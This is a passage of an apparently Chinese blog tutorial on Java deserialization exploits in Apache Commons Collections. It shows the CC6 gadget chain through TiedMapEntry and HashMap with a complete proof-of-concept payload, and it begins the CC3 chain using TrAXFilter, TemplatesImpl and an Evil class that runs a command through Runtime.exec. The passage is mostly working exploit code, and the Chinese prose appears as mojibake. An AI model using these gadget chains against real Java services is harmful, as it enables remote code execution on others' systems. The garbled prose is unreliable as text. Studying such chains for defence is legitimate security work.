class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TiedMapEntry</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Map</span>.Entry, KeyValue, Serializable &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TiedMapEntry</span><span class="hljs-params">(Map map, Object key)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        <span class="hljs-built_in">this</span>.map = map;<br>        <span class="hljs-built_in">this</span>.key = key;<br>    &#125;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getValue</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> map.get(key);<br>    &#125;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getKey</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> key;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> getValue();<br>        <span class="hljs-keyword">return</span> (getKey() == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : getKey().hashCode()) ^<br>               (value == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : value.hashCode()); <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ˜¾è€Œæ˜“è§çš„æ˜¯<code>getValue</code>éƒ¨åˆ†è°ƒç”¨äº†<code>get</code>æ–¹æ³•ï¼Œé‚£ä¹ˆå°±æœ‰é“¾å­ï¼š</p><p><code>hashCode()</code> &#x3D;&gt; <code>getValue()</code> &#x3D;&gt; <code>map.get(key)</code></p><p>hashCodeæ˜¯åœ¨URLDNSä¸­ä¹Ÿç”¨åˆ°çš„ï¼Œä½œä¸ºä¸€ä¸ªè®¿é—®DNSçš„è§¦å‘å™¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// HashMap#readObject</span><br><span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>    <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>    <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>    putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>&#125;<br><span class="hljs-comment">// ====================================================================</span><br><span class="hljs-comment">// HashMap#hash</span><br><span class="hljs-comment">// è°ƒç”¨hashæ˜¯ä¸ºä¿è¯é”®çš„å”¯ä¸€æ€§</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-type">int</span> h;<br>    <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>&#125;<br><span class="hljs-comment">// ====================================================================</span><br><span class="hljs-comment">// HashMap#put</span><br><span class="hljs-keyword">public</span> V <span class="hljs-title function_">put</span><span class="hljs-params">(K key, V value)</span> &#123;<br>        <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥å¾—åˆ°ä¸€ä¸ªé“¾ï¼š</p><p><code>readObject()</code> &#x3D;&gt; <code>hash(key)</code> &#x3D;&gt; <code>key.hashCode()</code></p><p>æ‰€ä»¥æˆ‘ä»¬å°±èƒ½å¾—å‡ºï¼Œåœ¨è¿™é‡Œè®©<strong>key &#x3D;&#x3D; TiedMapEntryå¯¹è±¡</strong>ï¼Œå°±èƒ½å®Œç¾è¿æ¥èµ·æ¥å‰é¢çš„é“¾å­äº†ã€‚</p><h4 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h4><p>å…ˆç»™å‡ºGadget Chainsï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream#readObject()<br>HashSet#readObject()<br>HashMap#put()<br>HashMap#hash()<br>TiedMapEntry#hashCode()<br>TiedMapEntry#getValue()<br>LazyMap#get()<br>                                <span class="hljs-comment">//æ¶æ„å¯¹è±¡åå°„é“¾éƒ¨åˆ†</span><br>      ChainedTransformer.transform()<br>                            ConstantTransformer#transform()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Class#getMethod()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Runtime#getRuntime()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Runtime#exec()<br></code></pre></td></tr></table></figure><p>åˆä»£ç›®ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>        <span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>        <span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>        <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>&#125;;<br><br><span class="hljs-comment">// fake_payload</span><br>Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<span class="hljs-keyword">new</span><br>    <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br><span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br><span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, transformerChain);<br><br><span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><span class="hljs-comment">// putçš„æ—¶å€™ä¹Ÿä¼šæ‰§è¡ŒhashCodeï¼Œä¸ºäº†é˜²æ­¢æœ¬åœ°è°ƒè¯•è§¦å‘payloadï¼Œè¿™é‡Œæ”¾å…¥fake_payload</span><br>expMap.put(tiedMapEntry, <span class="hljs-string">&quot;xxx&quot;</span>);<br><br><span class="hljs-comment">// å°†çœŸæ­£çš„transformersæ•°ç»„è®¾ç½®è¿›æ¥</span><br><span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>f.setAccessible(<span class="hljs-literal">true</span>);<br>f.set(transformerChain, transformers);<br><br><span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>oos.writeObject(expMap);<br>oos.close();<br><br><span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™ä¸ªæ˜¯æ²¡åŠæ³•ç›´æ¥ååºåˆ—åŒ–çš„ã€‚</p><p>å½“æˆ‘ä»¬æ‰§è¡Œ<code>Map.put()</code>çš„æ—¶å€™ä¼šè§¦å‘<code>hash()</code>ï¼Œè¿›è€Œç‰µåŠ¨æ•´æ¡é“¾ã€‚</p><p>å†æ¥çœ‹<code>LazyMap</code>çš„<code>get()</code>ï¼Œç”±äºæ˜¯æ‡’åŠ è½½å› æ­¤å¾—åˆ°å½“å‰mapä¸­æ²¡æœ‰keyï¼Œæ‰ä¼šæ»¡è¶³é‚£ä¸ªifæ¡ä»¶å†è°ƒç”¨åˆ°<code>factory.transform(key)</code>ç”Ÿæˆvalueï¼Œå†<code>map.put(key, value)</code>ï¼Œè¿™æ—¶å€™<code>lazyMap</code>ä¸­å°±æœ‰keyäº†ã€‚ï¼ˆè¿™é‡Œçš„keyæ˜¯<code>new TiedMapEntry</code>ä¼ å…¥çš„keyï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// LazyMap#get</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-comment">// create value for key if key is not currently in the map</span><br>    <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> factory.transform(key);<br>        map.put(key, value);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>    <span class="hljs-keyword">return</span> map.get(key);<br>&#125;<br></code></pre></td></tr></table></figure><p>è§£å†³æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œåªéœ€è¦æƒ³åŠæ³•æŠŠè¿™ä¸ªé”®å€¼å¯¹ä»<code>LazyMap</code>ä¸­ç§»é™¤å°±è¡Œï¼Œå³<code>lazyMap.remove(&quot;test&quot;);</code></p><p>Final CC6-POC:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, transformerChain);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;xxx&quot;</span>);<br><br>        lazyMap.remove(<span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(transformerChain, transformers);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(expMap);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/Commons-Collections/image-20240728211545706.png" alt="image-20240728211545706"></p><p>åˆ’æ—¶ä»£çš„æ„ä¹‰ã€‚</p><h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><p>CC4æ¶‰åŠåˆ°æ›´æ–°çš„Commons-Collections4ï¼Œæ‰€ä»¥ç•™åˆ°åé¢è®²ï¼Œè€ŒCC3åŒæ ·å…·æœ‰åˆ’æ—¶ä»£çš„æ„ä¹‰ï¼Œå› ä¸ºå®ƒçš„é€»è¾‘ç”¨åˆ°çš„æ˜¯æ¶æ„å­—èŠ‚ç ï¼Œè¿™å¯¹äºJavaååºåˆ—åŒ–æ¥è¯´æ˜¯ä¸ªå¾ˆå¸¸è§çš„Attackæ–¹å¼ã€‚</p><p>é¦–å…ˆéœ€è¦ä»‹ç»çš„æ˜¯JavaåŠ¨æ€åŠ è½½å­—èŠ‚ç çš„ä¸œè¥¿ã€‚</p><p>ä½ å¯èƒ½ä¼šçœ‹åˆ°å¾ˆå¤šæ¬¡ <code>Gadgets.createTemplatesImpl(command)</code> ï¼Œå¦å¤–ä½ ä¹Ÿè®¸æ›¾åœ¨<code>fastjson</code>ç­‰æ¼æ´çš„åˆ©ç”¨ä¸­çœ‹åˆ°è¿‡<code>TemplatesImpl</code>è¿™ä¸ªç±»ï¼Œå®ƒç©¶ç«Ÿæ˜¯ä»€ä¹ˆï¼Œä¸ºä½•å‡ºé•œç‡è¿™ä¹ˆé«˜å‘¢ï¼Ÿ</p><p>å­—èŠ‚ç æ˜¯ä»€ä¹ˆå°±ä¸åšè¿‡å¤šè¯´æ˜ï¼Œè¿™ä¸Javaä½œä¸ºé™æ€è¯­è¨€è€Œä¸”èƒ½å¤Ÿâ€œä¸€æ¬¡ç¼–è¯‘ï¼Œåˆ°å¤„è¿è¡Œâ€çš„å®—æ—¨æœ‰å…³ã€‚</p><p>åŠ è½½å­—èŠ‚ç çš„æ–¹å¼ä¹Ÿå¾ˆå¤šï¼Œè¿™é‡Œå…ˆä¸ä»‹ç»äº†ï¼Œåé¢ä¼šå•å¼€ä¸€ç« æ¥è®²è®²ã€‚</p><p>è¨€å½’æ­£ä¼ ï¼ŒCC3è¿™é‡Œçš„èƒŒæ™¯æ˜¯ä¸€ä¸ªQuestionï¼ŒCC1å’ŒCC6çš„sinkéƒ½åœ¨<code>InvokerTransformer</code>ä¸Šï¼Œè‹¥WAFç›´æ¥ç¦ç”¨äº†è¯¥ç±»ï¼Œæ˜¯å¦å°±æ‹¿å®ƒæ²¡æ³•äº†ï¼Ÿ</p><p>å½“ç„¶ä¸æ˜¯ã€‚ä½†è¿™é‡Œå°±åˆè¦è¯·å‡ºå¦ä¸€ä¸ªè§£å†³è¿™ä¸ªé—®é¢˜çš„ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter<br></code></pre></td></tr></table></figure><p><strong>â€œæˆ‘æ‰“å®¿å‚©ï¼ŸçœŸçš„å‡çš„ï¼Ÿâ€</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">TrAXFilter</span><span class="hljs-params">(Templates templates)</span> <span class="hljs-keyword">throws</span><br>    TransformerConfigurationException<br>&#123;<br>    _templates = templates;<br>    _transformer = (TransformerImpl) templates.newTransformer();<br>    _transformerHandler = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerHandlerImpl</span>(_transformer);<br>    _useServicesMechanism = _transformer.useServicesMechnism();<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆåˆ†æä¸€ä¸‹è¿™ä¸ª<code>TrAXFilter</code>ã€‚</p><p>è¯¥ç±»æ„é€ æ–¹æ³•ä¸­è°ƒç”¨äº†<code>(TransformerImpl) templates.newTransformer()</code></p><p><code>TransformerImpl</code>åœ¨åŠ è½½å­—èŠ‚ç çš„å¾ˆå¤šæ–‡ç« é‚£é‡Œæè¿‡ï¼Œ<code>newTransformer</code>æœ€åèƒ½è°ƒç”¨åˆ°<code>defineClass()</code>åŠ è½½æ¶æ„å­—èŠ‚ç ã€‚</p><p>ä½†æ˜¯ç›®å‰çœ‹æ¥å¦‚æœæ²¡æœ‰<code>InvokerTransfomer</code>ï¼Œ<code>TrAXFilter</code>çš„æ„é€ æ–¹æ³•ä¹Ÿæ— æ³•è°ƒç”¨</p><p>è¿™é‡Œè¦ç”¨åˆ°æ–°çš„<code>Transformer</code>å®ç°ç±»<code>InstantiateTransformer</code>ï¼Œçœ‹çœ‹å®ƒçš„<code>transform</code>ï¼Œå®ƒçš„ä½œç”¨å°±æ˜¯è°ƒç”¨æ„é€ å‡½æ•°ï¼Œè¿”å›ç±»å®ä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>    <span class="hljs-comment">//....</span><br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">con</span> <span class="hljs-operator">=</span> ((Class) input).getConstructor(iParamTypes);<br>    <span class="hljs-keyword">return</span> con.newInstance(iArgs);<br>    <span class="hljs-comment">//....</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h3><p>å…ˆç»™å‡ºGadget Chainsï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream#readObject()<br>AnnotationInvocationHandler#readObject()<br>Map(Proxy)#entrySet()<br>AnnotationInvocationHandler#invoke()<br>LazyMap#get()<br>ChainedTransformer#transform()<br>InstantiateTransformer#transform()<br>    TrAXFilter#TrAXFilter()<br>TemplatesImpl#newTransformer()<br>TemplatesImpl#getTransletInstance()<br>TemplatesImpl#defineTransletClasses()<br>TemplatesImpl$TransletClassLoader#defineclass()<br></code></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦ç”¨åˆ°<code>javassist</code>æ¥è·å–å­—èŠ‚ç ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.29.2-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>Evil.class</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span><br>            <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator,</span><br><span class="hljs-params">                          SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>demo</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>    field.setAccessible(<span class="hljs-literal">true</span>);<br>    field.set(obj, newValue);<br>&#125;<br><br><span 